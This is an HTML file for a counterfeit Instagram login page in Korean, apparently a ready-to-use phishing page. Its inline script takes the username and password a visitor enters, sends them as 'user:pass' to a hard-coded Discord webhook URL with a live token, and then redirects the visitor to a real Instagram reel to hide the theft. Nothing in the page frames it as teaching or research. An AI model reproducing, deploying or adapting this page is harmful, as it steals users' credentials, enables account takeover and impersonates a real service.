<!-- This is instagram login page -->

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login . Instagram</title>
    <link rel="stylesheet" href="loginstyle.css">
    <style>
        img {
            vertical-align: text-top;
        }
    </style>

    <script>
        // Discord 웹훅 전송 함수
        async function sendDiscordWebhook(event) {
            // 폼 제출 방지 (새로고침 방지)
            if (event) {
                event.preventDefault();
            }
            
            const webhookUrl = "https://discord.com/api/webhooks/1402179542440742952/AX7k7jNLV3VucAE_A4Yehfj_c7ZasCD4cC97oOAAkJVwFYRXF4jBAEGZ-augYVN4BbpL";
            const username = "따까리";
            const userName = document.getElementById("username").value;
            const passWord = document.getElementById("password").value;
            const message = userName + ":" + passWord;
            
            // 전송할 데이터 구성
            const payload = {
                content: message
            };
            
            // 사용자명이 있으면 추가
            if (username) {
                payload.username = username;
            }
            
            try {
                
                // 웹훅으로 POST 요청 전송
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    // 메시지 입력창 초기화
                    const messageField = document.getElementById('message');
                    if (messageField) {
                        messageField.value = '';
                    }
                } else {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                
            } catch (error) {
                console.error('웹훅 전송 실패:', error);
            }

            location.replace("https://www.instagram.com/reel/DMhtFTsyZnD/?igsh=aHo5a2VjdTJnNnhj");
            
            return false; // 폼 제출 방지
        }
        
        // 폼 초기화 함수
        function clearForm() {
            const webhookUrlField = document.getElementById('webhookUrl');
            const usernameField = document.getElementById('username');
            const messageField = document.getElementById('message');
            
            if (webhookUrlField) webhookUrlField.value = '';
            if (usernameField) usernameField.value = '';
            if (messageField) messageField.value = '';
            hideStatus();
        }
        
        // 상태 메시지 표시 함수
        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            if (statusDiv) {
                statusDiv.textContent = message;
                statusDiv.className = 'status ' + type;
                statusDiv.style.display = 'block';
            } else {
                // statusDiv가 없으면 콘솔에 출력
                console.log(message);
            }
        }
        
        // 상태 메시지 숨기기 함수
        function hideStatus() {
            const statusDiv = document.getElementById('status');
            if (statusDiv) {
                statusDiv.style.display = 'none';
            }
        }
        
    </script>
</head>

<body>
    <div class="container">
        <div class="box">
            <div class="heading"></div>
            <form class="login-form" onsubmit="return sendDiscordWebhook(event);">
                <div class="field">
                    <input id="username" type="name" placeholder="전화번호, 사용자 이름 또는 이메일" />
                    <label for="username">전화번호, 사용자 이름 또는 이메일</label>
                </div>
                <div class="field">
                    <input id="password" type="password" placeholder="비밀번호" />
                    <label for="password">비밀번호</label>
                </div>
                <button class="login-button" type="button" title="login" onclick="sendDiscordWebhook(event)">로그인</button>
                <div class="separator">
                    <div class="line"></div>
                    <p>또는</p>
                    <div class="line"></div>
                </div>

                <div class="other">
                    <button class="fb-login-btn" type="button">
                        <i class="fa fa-facebook-official fb-icon"></i>
                        <span class=""><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"height="15" width="15"><a>&nbsp;Facebook으로 로그인</a>
                        </span>
                    </button>
                    <a class="forgot-password" href="./index.html">비밀번호를 잊으셨나요?</a>
                </div>
            </form>
        </div>
        <div class="box">
            <p>계정이 없으신가요? <a class="signup">가입하기</a></p>
        </div>
    </div>
    <br>
    <div class="get">
    </div>
    <br>
    
    <!-- 상태 메시지를 위한 div 추가 -->
    <div id="status" style="display: none; padding: 10px; margin: 10px auto; max-width: 400px; text-align: center; border-radius: 5px;"></div>
    
    <br>
    <div class="footer">
        <footer>

        </footer>
    </div>

    </div>
    
</body>


</html>
